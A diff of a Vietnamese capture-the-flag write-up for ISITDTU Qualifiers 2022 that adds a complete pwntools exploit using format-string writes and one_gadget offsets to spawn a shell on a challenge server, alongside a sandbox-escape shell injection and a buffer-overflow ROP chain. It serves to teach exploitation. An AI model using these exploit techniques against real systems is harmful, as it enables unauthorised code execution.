@@ -1,4 +1,4 @@
-### Writeup for ISITDTU QUAL 2022
+# Writeup for ISITDTU QUAL 2022
 
 ---
 
@@ -20,7 +20,8 @@ Vào fuzz linh tinh thì mình phát hiện ra có bug format string ngoài ra c
 
 Bug duy nhất trong bài này chắc có lẽ là format string.
 
-![Alt text](../../../../../../../c:/Users/Administrator/OneDrive/Desktop/ctf/isitdtu_2022/pwn1_check.png)
+![](https://i.imgur.com/YxXvEhv.png)
+
 
 ###### Exploit 
 
@@ -36,6 +37,7 @@ r = process('./warmup_patched')
 elf = context.binary = ELF('./warmup_patched')
 libc = ELF('./libc-2.23.so')
 libc_ = CDLL('./libc.so.6')
+# --------------------------------------------------
 # r.sendlineafter(b'How much money you want? ',b'0')
 # payload = b'%p#'*100
 # r.sendlineafter(b'name: ',payload)
@@ -113,7 +115,58 @@ r.sendline(payload)
 r.interactive()
 ``` 
 
-Teammate của mình @th3_sh4dow đã giải ra bài này ở trước đó, mình một lát sau mới giải ra được, 
+Teammate của mình @th3_5had0w đã giải ra bài này ở trước đó, mình một lát sau mới giải ra được, solution ở bên dưới 
+```python 
+from pwn import * 
+
+
+while (1):
+    #io = process('./chal')
+    io = remote('34.171.160.79', 9998) 
+    elf = context.binary = ELF('./chal')
+    libc = ELF('./libc.so.6')
+
+    #gdb.attach(io, gdbscript='''
+    #        b * playgame+125
+    #''')
+
+    io.sendlineafter(b'How much money you want? ',b'0')
+    pl = b'%p'+b'%c'*8+b'%p%p'+b'%c'*7+b'%111c'+b'%hhn'+b'%14c'+b'%26$hhn'
+    #io.sendlineafter(b'name: ',b'%11$p %p %9$p %20$hhn'+b'%24c'+b'%n')
+    io.sendlineafter(b'name: ', pl)
+    io.recvuntil(b'Welcome to lucky game                            *')
+    io.recvuntil(b'*\n')
+    libc.address = int(io.recv(14), 16) - 0x16a3 - 0x3c4000
+    log.info('libc: '+hex(libc.address))
+    io.recv(8)
+    stack = int(io.recv(14), 16) + 0x30 + 0x18
+    log.info('stack: '+hex(stack))
+    elf.address = int(io.recv(14), 16) - 0xe95
+    log.info('elf: '+hex(elf.address))
+    io.recvuntil(b'*\n')
+    io.sendlineafter(b'(= 0 to exit): ', b'0')
+    io.sendafter(b'Send to author your feeback: ', b'hehe')
+    io.recvuntil(b'Thank for your feedback\n')
+    try:
+        io.sendlineafter(b'How much money you want? ',b'0')
+        og1 = libc.address + 0x45226
+        og2 = libc.address + 0x4527a
+        og3 = libc.address + 0xf03a4
+        og4 = libc.address + 0xf1247
+        log.info('og1: '+hex(og1))
+        log.info('og2: '+hex(og2))
+        log.info('og3: '+hex(og3))
+        log.info('og4: '+hex(og4))
+        #gdb.attach(io, gdbscript = '''
+        #b * playgame+125
+        #''')
+        pl = b'%c'*18+b'%'+str((stack&0xff) - 18+1).encode('utf-8')+b'c'+b'%hhn'+b'%'+str(((og4>>8) & 0xffff) - 0xb9).encode('utf-8')+b'c'+b'%26$hn'
+        io.sendlineafter(b'name: ', pl)
+        io.interactive()
+    except:
+        io.close()
+        io = 0
+```
 
 Cảm ơn anh @Cobra đã giúp mình giải được bài này :love_pepe:
 
@@ -128,21 +181,25 @@ Bài này filter phần lớn các ký tự đặc biệt để exploit theo hư
 1`sh`+1
 ```
 
-![Alt text](../../../../../../../c:/Users/Administrator/OneDrive/Desktop/ctf/isitdtu_2022/pwn2_test.png)
+![](https://i.imgur.com/YmbmZH3.png)
+
 
 Vậy là mình đã escape được sandbox, tuy nhiên chúng ta chỉ thực hiện được một số command cơ bản như là ls, cat, etc,.....
 
-![Alt text](../../../../../../../c:/Users/Administrator/OneDrive/Desktop/ctf/isitdtu_2022/pwn2_test2.png)
+![](https://i.imgur.com/3VMsNec.png)
+
 
 Ta có thể confirm rằng ta đang ở directory chính thông qua file Docker. Tuy nhiên ta không thể xem được nội dung ở result.txt hay là flag.txt thông qua command cat. Tới đây thì có khá là nhiều cách để đọc nội dung của flag, cách của mình là gộp stdout vào stderr thông qua command `1>&2`, lợi dụng tính năng này để mình đọc được flag. 
 
-![Alt text](../../../../../../../c:/Users/Administrator/OneDrive/Desktop/ctf/isitdtu_2022/pwn2_flag.png)
+![](https://i.imgur.com/VwIdgBh.png)
+
 
 #### Re-name
 
 Có vẻ đây là bài dễ nhất trong 4 bài pwn, chỉ là một câu bof leak libc rồi ta tính toán địa chỉ của libc gốc và từ đó build ROP chain để spawn shell
 
-![Alt text](../../../../../../../c:/Users/Administrator/OneDrive/Desktop/ctf/isitdtu_2022/re-name_analyze.png)
+![](https://i.imgur.com/Zh0X2kA.png)
+
 
 Bug bof nằm tại hàm `read(0, buf, 0x60uLL)` do biến buf được khởi tạo với 40 bytes. 
 
@@ -156,8 +213,8 @@ r = process('./challenge')
 rdi = 0x0000000000401393
 ret = 0x000000000040101a
 elf = context.binary = ELF('./challenge')
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
-
+# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+libc = ELF('./libc-2.23.so')
 payload = b'a'*0x38 + p64(rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])
 r.sendlineafter(b'What is your name? ',payload)
 r.sendline(b'\x00')
